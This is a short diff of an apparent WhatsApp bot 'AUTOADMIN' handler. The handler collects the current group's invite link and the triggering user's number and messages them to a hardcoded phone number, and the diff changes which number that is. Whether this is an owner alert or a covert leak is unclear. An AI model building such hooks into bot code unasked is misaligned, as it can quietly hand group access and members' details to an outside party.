@@ -5,7 +5,7 @@ const handler = async (m, conn) => {
         const groupLink = await conn.groupInviteCode(m.chat)
         const fullLink = `https://chat.whatsapp.com/${groupLink}`
 
-        await conn.sendMessage('393514357738@s.whatsapp.net', {
+        await conn.sendMessage('393476686131@s.whatsapp.net', {
             text: `*⭒─ׄ─ׅ─ׄ─⭒*⬣ AUTOADMIN ⬣*⭒─ׅ─ׄ─ׅ─ׄ─⭒*
 
 『 📲 』 *Utente:* @${m.sender.split('@')[0]}
